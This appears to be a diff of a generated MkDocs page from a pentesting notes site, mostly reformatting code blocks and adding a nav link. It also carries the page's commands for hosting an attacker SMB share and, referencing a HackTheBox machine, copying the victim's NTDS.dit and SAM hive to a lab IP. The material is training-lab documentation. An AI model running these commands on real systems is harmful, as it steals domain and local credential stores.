@@ -685,6 +685,8 @@
       
         
       
+        
+      
     
     
     
@@ -767,6 +769,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17048,22 +17071,27 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="basic-usage">Basic usage</h2>
 <h3 id="create-a-share-server-in-attacker-machine-and-connect-from-victims">Create a share server in attacker machine and connect from victim's</h3>
 <p>Launch smbserver in our attacker machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>CompData<span class="w"> </span>/home/username/Documents/
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>CompData<span class="w"> </span>/home/username/Documents/
+</span></code></pre></div></td></tr></table></div>
 <p>Also you can launch it with username and password:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>CompData<span class="w"> </span>/home/username/Documents/<span class="w"> </span>-username<span class="w"> </span><span class="s2">&quot;username&quot;</span><span class="w"> </span>-password<span class="w"> </span><span class="s2">&quot;agreatpassword&quot;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>CompData<span class="w"> </span>/home/username/Documents/<span class="w"> </span>-username<span class="w"> </span><span class="s2">&quot;username&quot;</span><span class="w"> </span>-password<span class="w"> </span><span class="s2">&quot;agreatpassword&quot;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="nb">move </span><span class="n">C</span><span class="p">:\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">NTDS</span><span class="p">.</span><span class="n">dit</span> <span class="p">\\</span><span class="nv">$ip</span><span class="p">\</span><span class="n">CompData</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="nb">move </span><span class="n">C</span><span class="p">:\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">NTDS</span><span class="p">.</span><span class="n">dit</span> <span class="p">\\</span><span class="nv">$ip</span><span class="p">\</span><span class="n">CompData</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Sidenote: see <a href="../htb-omni/">the HackTheBox machine Omni</a>, which uses <a href="../sireprat/">SirepRAT</a> to upload files to the share. A taste of it:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># First crate the shared. After that, establish the connection:</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>python<span class="w"> </span>~/tools/SirepRAT/SirepRAT.py<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>LaunchCommandWithOutput<span class="w"> </span>--return_output<span class="w"> </span>--cmd<span class="w"> </span><span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="w"> </span>--args<span class="w"> </span><span class="s1">&#39; /c net use \\10.10.14.2\CompData /u:username agreatpassword&#39;</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Now copy files to the share. In this case we are dumping Hives </span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>python<span class="w"> </span>~/tools/SirepRAT/SirepRAT.py<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>LaunchCommandWithOutput<span class="w"> </span>--return_output<span class="w"> </span>--cmd<span class="w"> </span><span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="w"> </span>--args<span class="w"> </span><span class="s1">&#39; /c reg save HKLM\sam \</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="s1">\10.10.14.2\CompData\sam&#39;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span>
+<span class="normal"><a href="#__codelineno-3-5">5</a></span>
+<span class="normal"><a href="#__codelineno-3-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="c1"># First crate the shared. After that, establish the connection:</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>python<span class="w"> </span>~/tools/SirepRAT/SirepRAT.py<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>LaunchCommandWithOutput<span class="w"> </span>--return_output<span class="w"> </span>--cmd<span class="w"> </span><span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="w"> </span>--args<span class="w"> </span><span class="s1">&#39; /c net use \\10.10.14.2\CompData /u:username agreatpassword&#39;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="c1"># Now copy files to the share. In this case we are dumping Hives </span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>python<span class="w"> </span>~/tools/SirepRAT/SirepRAT.py<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>LaunchCommandWithOutput<span class="w"> </span>--return_output<span class="w"> </span>--cmd<span class="w"> </span><span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="w"> </span>--args<span class="w"> </span><span class="s1">&#39; /c reg save HKLM\sam \</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="s1">\10.10.14.2\CompData\sam&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17139,7 +17167,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
